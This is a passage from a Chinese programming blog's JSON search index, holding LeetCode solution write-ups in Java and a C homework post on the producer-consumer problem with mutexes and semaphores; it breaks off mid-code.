&#125;&#125;","categories":[],"tags":[{"name":"排列组合","slug":"排列组合","permalink":"https://virgilchen97.github.io/tags/%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/"}]},{"title":"89-格雷编码","slug":"9-格雷编码","date":"2019-08-29T09:11:56.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/08/9-格雷编码/","link":"","permalink":"https://virgilchen97.github.io/2019/08/9-%E6%A0%BC%E9%9B%B7%E7%BC%96%E7%A0%81/","excerpt":"格雷编码是一个二进制数字系统，在该系统中，两个连续的数值仅有一个位数的差异。 给定一个代表编码总位数的非负整数 n，打印其格雷编码序列。格雷编码序列必须以 0 开头。","text":"格雷编码是一个二进制数字系统，在该系统中，两个连续的数值仅有一个位数的差异。 给定一个代表编码总位数的非负整数 n，打印其格雷编码序列。格雷编码序列必须以 0 开头。 格雷码 定义 十进制数 格雷码 0 0000 1 0001 2 0011 3 0010 在一组数的编码中，若任意两个相邻的代码只有一位二进制数不同，则称这种编码为格雷码（Gray Code），另外由于最大数与最小数之间也仅一位数不同，即“首尾相连”，因此又称循环码或反射码。 生成方法 1位格雷码有两个码字 n+1 位格雷码中的前 2^n 个码字等于 n 位格雷码的码字，按顺序书写，加前缀 0 n+1 位格雷码中的后 2^n 个码字等于 n 位格雷码的码字，按逆序书写，加前缀 1 n+1 位格雷码的集合 = n 位格雷码集合(顺序)加前缀 0 + n 位格雷码集合(逆序)加前缀 1 解法 知道了格雷码的生成原理，就可以轻松解决了 12345678910111213141516171819202122232425import java.util.*;class Solution &#123; public List&lt;Integer&gt; grayCode(int n) &#123; List&lt;Integer&gt; res = new ArrayList&lt;&gt;(); if(n == 0)&#123; res.add(0); &#125;else&#123; res.add(0); res.add(1); for(int i = 1; i &lt; n; i++)&#123; generate(res, i); &#125; &#125; return res; &#125; public void generate(List&lt;Integer&gt; res, int digit)&#123; int size = res.size(); int one = 1; one &lt;&lt;= digit; for(int i = size - 1; i &gt;= 0; i--)&#123; res.add(one | res.get(i)); &#125; &#125;&#125;","categories":[],"tags":[]},{"title":"二叉树问题总结","slug":"05-105-构建二叉树问题","date":"2019-08-29T09:11:56.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/08/05-105-构建二叉树问题/","link":"","permalink":"https://virgilchen97.github.io/2019/08/05-105-%E6%9E%84%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91%E9%97%AE%E9%A2%98/","excerpt":"总结了根据两种遍历来重建二叉树的问题","text":"总结了根据两种遍历来重建二叉树的问题 二叉树构建问题总结 105. 从前序和中序构建二叉树 解法 首先根据前序遍历的性质，前序遍历列表中的第一个元素一定是根节点，因此我们可以取出前序遍历中的第一个元素，在中序遍历列表中找出其位置，该位置左侧的所有元素便是根节点左子树的所有元素，该位置右侧的元素就是根节点右子树的所有元素。接着递归构建左子树和右子树便完成了树的构建。 123456789101112131415161718192021222324252627282930313233import java.util.*;class Solution &#123; int inorder[]; int preorder[]; int index = 0; // 便于从中序遍历列表中找出元素，使用了哈希表 Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); public TreeNode build(int left, int right)&#123; if(left &gt; right) return null; // 获取前序遍历的第一个元素 int now = preorder[index]; // 找出该元素在中序遍历列表中的位置 int center = map.get(now); TreeNode root = new TreeNode(now); index++; //递归构建左右子树 root.left = build(left, center-1); root.right = build(center+1, right); return root; &#125; public TreeNode buildTree(int[] preorder, int[] inorder) &#123; this.preorder = preorder; this.inorder = inorder; for(int i = 0; i &lt; preorder.length; i++)&#123; map.put(inorder[i], i); &#125; return build(0, preorder.length - 1); &#125;&#125; 106. 从后序和中序构建二叉树 解法 本题思路与105题基本类似，不同的是后序遍历是从下至上，从左至右的，因此后序遍历列表的末尾元素一定是根节点。但是不能仅仅将105题改为从后序的结尾取根元素，因为倒序 12345678910111213141516171819202122232425262728import java.util.*;class Solution &#123; int inorder[]; int postorder[]; int index; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); public TreeNode build(int left, int right)&#123; if(left &gt; right) return null; int now = postorder[index]; int center = map.get(now); TreeNode root = new TreeNode(now); index--; root.right = build(center+1, right); root.left = build(left, center-1); return root; &#125; public TreeNode buildTree(int[] inorder, int[] postorder) &#123; this.postorder = postorder; this.inorder = inorder; index = inorder.length - 1; for(int i = 0; i &lt; postorder.length; i++)&#123; map.put(inorder[i], i); &#125; return build(0, postorder.length - 1); &#125;&#125;","categories":[],"tags":[{"name":"二叉树","slug":"二叉树","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"75-颜色分类","slug":"5-颜色分类","date":"2019-08-26T09:11:56.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/08/5-颜色分类/","link":"","permalink":"https://virgilchen97.github.io/2019/08/5-%E9%A2%9C%E8%89%B2%E5%88%86%E7%B1%BB/","excerpt":"给定一个包含红色、白色和蓝色，一共 n 个元素的数组，原地对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。 此题中，我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。 注意: 不能使用代码库中的排序函数来解决这道题。 例子 12输入: [2,0,2,1,1,0]输出: [0,0,1,1,2,2] 进阶 一个直观的解决方案是使用计数排序的两趟扫描算法。首先，迭代计算出0、1 和 2 元素的个数，然后按照0、1、2的排序，重写当前数组。 你能想出一个仅使用常数空间的一趟扫描算法吗？","text":"给定一个包含红色、白色和蓝色，一共 n 个元素的数组，原地对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。 此题中，我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。 注意: 不能使用代码库中的排序函数来解决这道题。 例子 12输入: [2,0,2,1,1,0]输出: [0,0,1,1,2,2] 进阶 一个直观的解决方案是使用计数排序的两趟扫描算法。首先，迭代计算出0、1 和 2 元素的个数，然后按照0、1、2的排序，重写当前数组。 你能想出一个仅使用常数空间的一趟扫描算法吗？ 解法 三指针法 设定一个左指针 l 指向左侧0的边界，设定一个右指针 r 指向右侧2的边界，在使用一个指针 i 对数组进行扫描, 如果 nums[i] = 0 则交换 nums[i] 和 nums[l], 若 nums[i] = 2 , 则交换 nums[i] 和 nums[r]。 While i &lt;= r : 若 nums[i] = 0 ：交换第 i 个和第 l 个元素，并将指针都向右移。 都向右移动的原因是此时 i 左侧的元素全部都被扫描过了，不需要再次扫描 若 nums[i] = 2 ：交换第 i 个和第 r 个元素，并将 r 指针左移 。 不移动 i 指针的原因是此时从右侧换来的元素是未知的，需要重新判断 若 nums[i] = 1 ：将指针 i 右移。 代码 1234567891011121314151617181920class Solution &#123; public void sortColors(int[] nums) &#123; int l = 0; int r = nums.length - 1; int i = 0; while(i &lt;= r)&#123; if(nums[i] == 0)&#123; int temp = nums[l]; nums[l++] = nums[i]; nums[i++] = temp; &#125;else if(nums[i] == 2)&#123; int temp = nums[r]; nums[r--] = nums[i]; nums[i] = temp; &#125;else&#123; i++; &#125; &#125; &#125;&#125;","categories":[],"tags":[{"name":"指针","slug":"指针","permalink":"https://virgilchen97.github.io/tags/%E6%8C%87%E9%92%88/"}]},{"title":"447-回旋镖的数量","slug":"47-回旋镖的数量","date":"2019-07-12T09:11:56.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/07/47-回旋镖的数量/","link":"","permalink":"https://virgilchen97.github.io/2019/07/47-%E5%9B%9E%E6%97%8B%E9%95%96%E7%9A%84%E6%95%B0%E9%87%8F/","excerpt":"给定平面上 n 对不同的点，“回旋镖” 是由点表示的元组 (i, j, k) ，其中 i 和 j 之间的距离和 i 和 k 之间的距离相等**（需要考虑元组的顺序）**。 找到所有回旋镖的数量。你可以假设 n 最大为 500，所有点的坐标在闭区间 [-10000, 10000] 中。 例子 12345678输入:[[0,0],[1,0],[2,0]]输出:2解释:两个回旋镖为 [[1,0],[0,0],[2,0]] 和 [[1,0],[2,0],[0,0]]","text":"给定平面上 n 对不同的点，“回旋镖” 是由点表示的元组 (i, j, k) ，其中 i 和 j 之间的距离和 i 和 k 之间的距离相等**（需要考虑元组的顺序）**。 找到所有回旋镖的数量。你可以假设 n 最大为 500，所有点的坐标在闭区间 [-10000, 10000] 中。 例子 12345678输入:[[0,0],[1,0],[2,0]]输出:2解释:两个回旋镖为 [[1,0],[0,0],[2,0]] 和 [[1,0],[2,0],[0,0]] 解法 1. 暴力循环法 在本题目中构成一个回旋镖需要有3个点，因此就使用三个暴力循环遍历所有可能，并判断当前的三个点是否构成回旋镖 代码 12345678910111213141516171819202122232425class Solution &#123; public int numberOfBoomerangs(int[][] points) &#123; int count=0; for(int i = 0 ; i &lt; points.length; i++)&#123; for(int j = 0; j &lt; points.length; j++)&#123; if(i!=j)&#123; for(int k = 0; k &lt; points.length; k++)&#123; if(k!=i &amp;&amp; k!=j)&#123; if(getDis(points[i], points[j]) == getDis(points[j], points[k]))&#123; count++; &#125; &#125; &#125; &#125; &#125; &#125; return count; &#125; public int getDis(int[] x, int[] y)&#123; int a = x[0]-y[0]; int b = x[1]-y[1]; return a*a + b*b; &#125;&#125; 2. 优化循环 在上一种解法中我们发现很多点与点之间的距离都被重复计算了多次，因此我们可以以一个点 i 为起始，计算出到 i 的距离相同的点的数量，例如距离为1的有3个点，距离为2的有1个点，并储存在哈希表中，最后对数量多于两个点的距离进行组合，得出结果。 123456789101112131415161718192021222324252627282930313233343536class Solution &#123; public int numberOfBoomerangs(int[][] points) &#123; int count=0; for(int i = 0 ; i &lt; points.length; i++)&#123; Map&lt;Integer,Integer&gt; distance = new HashMap&lt;&gt;(); for(int j = 0; j &lt; points.length; j++)&#123; if(i!=j)&#123; int l = getDis(points[i], points[j]); if(distance.containsKey(l))&#123; int number = distance.get(l) + 1; distance.put(l, number); &#125;else&#123; distance.put(l, 1); &#125; &#125; &#125; Iterator iter = distance.entrySet().iterator(); while (iter.hasNext()) &#123; Map.Entry entry = (Map.Entry) iter.next(); int numberOfPoints = (int)entry.getValue(); if(numberOfPoints &gt;= 2)&#123; count += numberOfPoints * (numberOfPoints -1); &#125; &#125; &#125; return count; &#125; public int getDis(int[] x, int[] y)&#123; int a = x[0]-y[0]; int b = x[1]-y[1]; return a*a + b*b; &#125;&#125;","categories":[],"tags":[]},{"title":"441-排列硬币","slug":"41-排列硬币","date":"2019-06-07T06:47:33.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/06/41-排列硬币/","link":"","permalink":"https://virgilchen97.github.io/2019/06/41-%E6%8E%92%E5%88%97%E7%A1%AC%E5%B8%81/","excerpt":"你总共有 nnn 枚硬币，你需要将它们摆成一个阶梯形状，第 kkk 行就必须正好有 kkk 枚硬币。 给定一个数字 nnn，找出可形成完整阶梯行的总行数。 nnn 是一个非负整数，并且在32位有符号整型的范围内。 示例: 12345678n = 5硬币可排列成以下几行:¤¤ ¤¤ ¤因为第三行不完整，所以返回2.","text":"你总共有 nnn 枚硬币，你需要将它们摆成一个阶梯形状，第 kkk 行就必须正好有 kkk 枚硬币。 给定一个数字 nnn，找出可形成完整阶梯行的总行数。 nnn 是一个非负整数，并且在32位有符号整型的范围内。 示例: 12345678n = 5硬币可排列成以下几行:¤¤ ¤¤ ¤因为第三行不完整，所以返回2. 解法 求根公式，等差数列求和 等差数列求和公式： S=(1+n)n2S=\\frac{(1+n)n}{2} S=2(1+n)n​ 求根公式： x=−b±b2−4ac2ax=\\frac{-b±\\sqrt{b^2-4ac}}{2a} x=2a−b±b2−4ac​​ 本题目中要求解的问题： S=(1+k)k2&lt;nS=\\frac{(1+k)k}{2}&lt;n S=2(1+k)k​&lt;n 求 kkk 的最大值 因为 n,k&gt;0n,k&gt;0n,k&gt;0 可得： x=−1±1+8k2&lt;nx=\\frac{-1±\\sqrt{1+8k}}{2}&lt;n x=2−1±1+8k​​&lt;n 代码 1234567class Solution &#123; public int arrangeCoins(int n) &#123; long a = 2L*n; Double b = Math.sqrt(0.25+a); return (int)(b - 0.5); &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"数学题","slug":"数学题","permalink":"https://virgilchen97.github.io/tags/%E6%95%B0%E5%AD%A6%E9%A2%98/"}]},{"title":"437-路径总和III","slug":"37-路径总和III","date":"2019-05-30T14:25:59.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/05/37-路径总和III/","link":"","permalink":"https://virgilchen97.github.io/2019/05/37-%E8%B7%AF%E5%BE%84%E6%80%BB%E5%92%8CIII/","excerpt":"给定一个二叉树，它的每个结点都存放着一个整数值。 找出路径和等于给定数值的路径总数。 路径不需要从根节点开始，也不需要在叶子节点结束，但是路径方向必须是向下的（只能从父节点到子节点）。 二叉树不超过1000个节点，且节点数值范围是 [-1000000,1000000] 的整数。 例子 123456789101112131415root = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8 10 / \\ 5 -3 / \\ \\ 3 2 11 / \\ \\3 -2 1返回 3。和等于 8 的路径有:1. 5 -&gt; 32. 5 -&gt; 2 -&gt; 13. -3 -&gt; 11","text":"给定一个二叉树，它的每个结点都存放着一个整数值。 找出路径和等于给定数值的路径总数。 路径不需要从根节点开始，也不需要在叶子节点结束，但是路径方向必须是向下的（只能从父节点到子节点）。 二叉树不超过1000个节点，且节点数值范围是 [-1000000,1000000] 的整数。 例子 123456789101112131415root = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8 10 / \\ 5 -3 / \\ \\ 3 2 11 / \\ \\3 -2 1返回 3。和等于 8 的路径有:1. 5 -&gt; 32. 5 -&gt; 2 -&gt; 13. -3 -&gt; 11 解法 在这里使用两个递归，第一个递归对整个二叉树进行DFS, 第二个递归对于第一个递归遍历到的每一个节点，得出以当前节点为根的树从根开始有多少满足条件的路径。 class Solution &#123; // 外层递归，对树进行DFS public int pathSum(TreeNode root, int sum) &#123; if(root == null)&#123; return 0; &#125; return pathSum2(root, sum, 0) + pathSum(root.right,sum)+pathSum(root.left,sum); &#125; // 内层递归，对外层递归达到的节点为根的子树进行DFS public int pathSum2(TreeNode node, int sum, int sumNow)&#123; if(node == null)&#123; return 0; &#125;else if(sumNow + node.val == sum)&#123; return 1 + pathSum2(node.left, sum, sumNow + node.val) + pathSum2(node.right, sum, sumNow + node.val); &#125;else&#123; return pathSum2(node.left, sum, sumNow + node.val) + pathSum2(node.right, sum, sumNow + node.val); &#125; &#125; &#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"二叉树","slug":"二叉树","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"name":"递归","slug":"递归","permalink":"https://virgilchen97.github.io/tags/%E9%80%92%E5%BD%92/"}]},{"title":"405-数字转换为十六进制数","slug":"05-数字转换为十六进制数","date":"2019-05-25T09:51:46.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/05/05-数字转换为十六进制数/","link":"","permalink":"https://virgilchen97.github.io/2019/05/05-%E6%95%B0%E5%AD%97%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%95%B0/","excerpt":"给定一个整数，编写一个算法将这个数转换为十六进制数。对于负整数，我们通常使用 补码运算 方法。 注意: 十六进制中所有字母(a-f)都必须是小写。 十六进制字符串中不能包含多余的前导零。如果要转化的数为0，那么以单个字符'0'来表示；对于其他情况，十六进制字符串中的第一个字符将不会是0字符。 给定的数确保在32位有符号整数范围内。 不能使用任何由库提供的将数字直接转换或格式化为十六进制的方法。 示例 1： 12345输入:26输出:&quot;1a&quot; 示例 2： 12345输入:-1输出:&quot;ffffffff&quot;","text":"给定一个整数，编写一个算法将这个数转换为十六进制数。对于负整数，我们通常使用 补码运算 方法。 注意: 十六进制中所有字母(a-f)都必须是小写。 十六进制字符串中不能包含多余的前导零。如果要转化的数为0，那么以单个字符'0'来表示；对于其他情况，十六进制字符串中的第一个字符将不会是0字符。 给定的数确保在32位有符号整数范围内。 不能使用任何由库提供的将数字直接转换或格式化为十六进制的方法。 示例 1： 12345输入:26输出:&quot;1a&quot; 示例 2： 12345输入:-1输出:&quot;ffffffff&quot; 解法 1. 普通进制转换（取模） 我起初的思路，不断地模除16转换为16进制，负数则使用补码，由于Java中没有unsigned类型，因此使用了long。 代码 1234567891011121314151617181920212223242526class Solution &#123; public String toHex(int num) &#123; long numLong; if(num&lt;0)&#123; numLong = 4294967296L + num; &#125;else if(num &gt; 0)&#123; numLong = num; &#125;else&#123; return &quot;0&quot;; &#125; char res[] = new char[8]; int i = 7; while(numLong &gt; 0)&#123; int now = (int)(numLong % 16L); if(now&lt;10)&#123; res[i] = (char)(now+&#x27;0&#x27;); &#125;else&#123; res[i] = (char)(now - 10 + &#x27;a&#x27;); &#125; i--; numLong /=16; &#125; return String.copyValueOf(res, i+1, 7-i); &#125;&#125; 在代码中，当num&lt;0时，题目中给出输入数字不会超过32位整型的上限，32位无符号整型的上限就是2^32 - 1 = 4294967295, 通过计算可以得到一个负数在次范围内二进制补码对应的数字就是 4294967295 + num + 1, 例如 -1 = 4294967295 + -1 + 1 = 4294967295 = ffffffff(hex) 2. 位运算 在学习进制转换的过程中我们都学过，二进制是可以每四位直接转换为16进制的，因此我们可以直接在Java中操作二进制，每次将输入的num与0xf(00001111)进行与操作，获取最低位的四位二进制，直接得到16进制的值，然后将num右移四位，以此类推，直到num所有位都为0。 123456789101112131415class Solution &#123; public String toHex(int num) &#123; if(num == 0)&#123; return &quot;0&quot;; &#125; StringBuilder sb = new StringBuilder(); String hex = &quot;0123456789abcdef&quot;; while(num!=0) &#123; int now = num &amp; 0xf; sb.insert(0, hex.charAt(now)); num &gt;&gt;&gt;= 4; &#125; return sb.toString(); &#125;&#125; 需要注意的是在Java中位移运算符有两种，分别是&gt;&gt;&gt;,&lt;&lt;&lt;和&gt;&gt;,&lt;&lt;，这两种的区别是，前者的位移操作包含符号位，而后者的操作会排除符号位，在本题目中显然我们应当使用前者。","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"位运算","slug":"位运算","permalink":"https://virgilchen97.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"}]},{"title":"404-左子树之和","slug":"04-左子树之和","date":"2019-05-25T08:37:24.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/05/04-左子树之和/","link":"","permalink":"https://virgilchen97.github.io/2019/05/04-%E5%B7%A6%E5%AD%90%E6%A0%91%E4%B9%8B%E5%92%8C/","excerpt":"计算给定二叉树的所有左叶子之和。 例子 1234567 3 / \\ 9 20 / \\ 15 7在这个二叉树中，有两个左叶子，分别是 9 和 15，所以返回 24","text":"计算给定二叉树的所有左叶子之和。 例子 1234567 3 / \\ 9 20 / \\ 15 7在这个二叉树中，有两个左叶子，分别是 9 和 15，所以返回 24 解法 我的解法是，在普通的递归中多加入一个参数，让父节点告诉子节点它是右子树还是左子树，这样到达叶子节点时，只有左叶子才返回自身的值，完成目标。 代码 12345678910111213141516171819202122232425class Solution &#123; int sum = 0; public int sumOfLeftLeaves(TreeNode root) &#123; if(root == null)&#123; return 0; &#125; return sum(root, false); &#125; public int sum(TreeNode node, boolean isLeft)&#123; if(node.left == null &amp;&amp; node.right !=null)&#123; return sum(node.right, false); &#125;else if(node.left != null &amp;&amp; node.right == null)&#123; return sum(node.left, true); &#125;else if(node.left !=null &amp;&amp; node.right != null)&#123; return sum(node.left, true)+sum(node.right, false); &#125;else&#123; if(isLeft)&#123; return node.val; &#125;else&#123; return 0; &#125; &#125; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"二叉树","slug":"二叉树","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"401-二进制手表","slug":"01-二进制手表","date":"2019-05-25T07:06:30.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/05/01-二进制手表/","link":"","permalink":"https://virgilchen97.github.io/2019/05/01-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%89%8B%E8%A1%A8/","excerpt":"二进制手表顶部有 4 个 LED 代表小时（0-11），底部的 6 个 LED 代表分钟（0-59）。 每个 LED 代表一个 0 或 1，最低位在右侧。 例如，上面的二进制手表读取 “3:25”。 给定一个非负整数 n 代表当前 LED 亮着的数量，返回所有可能的时间。 例子 12输入: n = 1返回: [&quot;1:00&quot;, &quot;2:00&quot;, &quot;4:00&quot;, &quot;8:00&quot;, &quot;0:01&quot;, &quot;0:02&quot;, &quot;0:04&quot;, &quot;0:08&quot;, &quot;0:16&quot;, &quot;0:32&quot;]","text":"二进制手表顶部有 4 个 LED 代表小时（0-11），底部的 6 个 LED 代表分钟（0-59）。 每个 LED 代表一个 0 或 1，最低位在右侧。 例如，上面的二进制手表读取 “3:25”。 给定一个非负整数 n 代表当前 LED 亮着的数量，返回所有可能的时间。 例子 12输入: n = 1返回: [&quot;1:00&quot;, &quot;2:00&quot;, &quot;4:00&quot;, &quot;8:00&quot;, &quot;0:01&quot;, &quot;0:02&quot;, &quot;0:04&quot;, &quot;0:08&quot;, &quot;0:16&quot;, &quot;0:32&quot;] 解法 直接循环所有时间的可能，将其中二进制和与输入相符合的结果加入返回数组。 12345678910111213141516171819202122232425262728293031class Solution &#123; public List&lt;String&gt; readBinaryWatch(int num) &#123; List&lt;String&gt; res = new ArrayList&lt;String&gt;(); for(int i = 0; i&lt;12;i++)&#123; for(int j = 0; j&lt;60;j++)&#123; if(sumOfBin(i,j)==num)&#123; /* String nowRes = String.format(&quot;%d:%02d&quot;, i,j); 原始方法 */ String nowRes = i + &quot;:&quot; + (j &lt; 10 ? &quot;0&quot; + j : j); res.add(nowRes); &#125; &#125; &#125; return res; &#125; public int sumOfBin(int hour, int minute)&#123; return sumBin(hour)+sumBin(minute); &#125; public int sumBin(int number)&#123; int sum = 0; while(number &gt; 0)&#123; //010 sum += number%2; number /=2; &#125; return sum; &#125;&#125; 值得注意的问题是，String.format 这个函数会显著拖慢程序运行，两种方式一次耗费37ms，另一次耗费4ms，差距还是很大的.","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"二进制","slug":"二进制","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]},{"title":"LeetCode-367-有效的完全平方数","slug":"67-有效的完全平方数","date":"2019-05-12T13:56:35.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/05/67-有效的完全平方数/","link":"","permalink":"https://virgilchen97.github.io/2019/05/67-%E6%9C%89%E6%95%88%E7%9A%84%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/","excerpt":"给定一个正整数 num，编写一个函数，如果 num 是一个完全平方数，则返回 True，否则返回 False。 说明：不要使用任何内置的库函数，如 sqrt。 例子 12345输入：16输出：True输入：14输出：False","text":"给定一个正整数 num，编写一个函数，如果 num 是一个完全平方数，则返回 True，否则返回 False。 说明：不要使用任何内置的库函数，如 sqrt。 例子 12345输入：16输出：True输入：14输出：False 解法 1. 二分查找 传统的二分查找方法, 需要注意的是在正常情况下mid*mid有可能会超越int的范围，这个时候可以改用long，或者像本题中的解法，int范围内最大的完全平方数为46340^2, 因此结果一定不会大于46340。 12345678910111213141516171819202122class Solution &#123; public boolean isPerfectSquare(int num) &#123; if(num == 1)&#123; return true; &#125; int start=0; int end = num/2&lt;46340?num/2:46340; while(start&lt;=end)&#123; int mid = (end+start)/2; int square = mid * mid; if(square &gt; num)&#123; end = mid - 1; &#125;else if(square&lt;num)&#123; start = mid + 1; &#125;else if(square == num)&#123; return true; &#125; &#125; return false; &#125;&#125; 2. 数学方法 利用了如下规律： n^2 = 1 + 3 + 5 + 7 + ··· + 2n-1 其实就是把后面的使用等差数列求和公式简化一下，但是比二分法速度慢。 1234567891011121314class Solution &#123; public boolean isPerfectSquare(int num) &#123; int i = 1; while(num &gt; 0)&#123; num -= (2*i-1); i++; &#125; if(num==0)&#123; return true; &#125;else&#123; return false; &#125; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"二分查找","slug":"二分查找","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"}]},{"title":"操作系统-读者写者问题","slug":"操作系统-读者写者问题","date":"2019-05-12T05:57:47.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/05/操作系统-读者写者问题/","link":"","permalink":"https://virgilchen97.github.io/2019/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AF%BB%E8%80%85%E5%86%99%E8%80%85%E9%97%AE%E9%A2%98/","excerpt":"记录一下一个读者写者问题变体的作业","text":"记录一下一个读者写者问题变体的作业 问题 实现一个生产者-消费者模型，其中生产者消费者以及缓存需要满足下列要求 生产者 共有3个生产者 Producer A produces a data item once a second Producer B produces a data item every two seconds Producer C produces a data item every three seconds 生产者产生的产品有一个唯一的序列号和生产者ID 消费者 共有两个消费者 First consumer takes one item per second Second consumer tries to take 2 items every period The period is 2 seconds if no item is availableThe period is 3 seconds if 1 item is availableThe period is 4 seconds if 2 items are available 消费者消费一个产品时，要输出消费者id，生产者id，唯一序列号和当前系统时间 缓存 大小为10 用互斥锁和信号量管理 复习 临界区（Critical Section） 每个进程中访问临界资源的那段代码称为临界区（Critical Section）（临界资源是一次仅允许一个进程使用的共享资源）。每次只准许一个进程进入临界区，进入后不允许其他进程进入。不论是硬件临界资源，还是软件临界资源，多个进程必须互斥地对它进行访问。 在本题中buffer就是一个临界区的例子，生产者线程和消费者线程会同时对buffer进行访问，而我们就要注意避免在buffer上的 Race Condition. 竞态条件（Race Condition） 举例来说，如果计算机中的两个进程同时试图修改一个共享内存的内容，在没有并发控制的情况下，最后的结果依赖于两个进程的执行顺序与时机。而且如果发生了并发访问冲突，则最后的结果是不正确的。 例子 假设现在有两个线程，都想要给一个全局变量i加1，可能会出现下面这种情况: Thread 1 Thread 2 i read value ← 0 increase value 0 write back → 1 read value ← 1 increase value 1 write back → 2 此时程序执行没有出现错误，但是也可能会出现下面的情况： Thread 1 Thread 2 i 0 read value ← 0 read value ← 0 increase value 0 increase value 0 write back → 1 write back → 1 结果出现了错误。 互斥锁（Mutex） 互斥锁是一种用于解决线程同步问题的一种解决方案，在一个线程要进入临界区前，需要先获得互斥锁，并给互斥锁上锁，在退出临界区前，要解锁互斥锁。这样就可以保证始终只有一个线程在临界区中执行。 在本题目中，mutex就是互斥锁。 信号量（Semaphore） 进程间通信处理同步互斥的机制。信号量是一个计数器，可以用来控制多个进程对共享资源的访问。它常作为一种锁机制，防止某进程正在访问共享资源时，其他进程也访问该资源。 与互斥锁不同的是，信号量是负责进程的同步，而互斥锁时负责进程的互斥。互斥锁由一个线程得到后必须自己释放，而信号量一个线程得到后可以由另一个线程释放。 本题目中empty和full就是信号量 解法 缓存 全局变量 12345678// buffer 本体，10个char*指针组成的指针数组char *buffer[10];// 进入缓存的位置int in ;// 出缓存的位置int out ;// 互斥锁，empty信号量表示缓存中的空位数，full信号量表示缓存的满位数int mutex , empty , full; 本体 1234567891011void inBuffer(char * data)&#123; buffer[in] = data; in = (in+1)%10;&#125;char* outBuffer()&#123; char* ret = buffer[out]; buffer[out] = 0; out = (out+1)%10; return ret;&#125; 生产者 12345678910111213141516171819202122232425262728293031323334353637void producer(int id)&#123; while(1)&#123; // 获取empty信号量 // 具体的解释是，empty代表的是缓存剩余的位置数， // 如果缓存没有剩余的位置了(empty &lt;= 0), 那么生产者线程就必须等待， // 直到缓存中有新的空位。 while(empty &lt;= 0); // 退出上面的while循环代表缓存有空位了 // 空位数-1 empty --; // 等待互斥锁 while(mutex &lt;= 0); // 互斥锁上锁 mutex--; // 产生随机序列号 srand((unsigned)(time(NULL)-(id+1)*10)); int seq = 10000000+rand()%89999999; char product[100]; sprintf(product, &quot;Producer %d, %d&quot;,id, seq); // 将产品放到缓存中 inBuffer(product); // 释放互斥锁 mutex++; // 缓存中已用位置数+1 full++; sleep(id); &#125;&#125; 消费者 消费者1 1234567891011121314151617181920212223242526272829303132333435363738void consumer1()&#123; while(1)&#123; // 获取full信号量 // 具体的解释是，full代表的是缓存已经使用的位置数， // 如果缓存为空(full &lt;= 0), 那么消费者线程就必须等待， // 直到缓存中有新的产品。 while(full &lt;= 0); // 退出上面的while循环代表缓存有产品了 // 缓存占用数+1 full--; // 等待互斥锁 while(mutex &lt;= 0); // 互斥锁上锁 mutex--; // 获取一个产品 char* get = outBuffer(); // 释放互斥锁 mutex++; // 缓存中空位数+1 empty++; // 输出信息 time_t now; struct tm *timenow; time(&amp;now); timenow = localtime(&amp;now); printf(&quot;Consumer 1, %s, %s&quot;, get, asctime(timenow)); sleep(1); &#125;&#125; 消费者2 123456789101112131415161718192021222324252627282930313233343536void consumer2()&#123; while(1) &#123; // 主要变化就是在full信号量的处理上，对于full值的不同，等待时间不同 // full 为0和为1时，消费者2仍不能消费 if (full &lt;= 0) &#123; sleep(2); continue; &#125; else if (full == 1) &#123; sleep(3); continue; &#125; else &#123; full -= 2; // lock mutex while (mutex &lt;= 0); mutex--; // get an product; char *get = outBuffer(); // unlock mutex; mutex++; // signal(empty) empty += 2; // Print out message; time_t now; struct tm *timenow; time(&amp;now); timenow = localtime(&amp;now); printf(&quot;Consumer 2, %s, 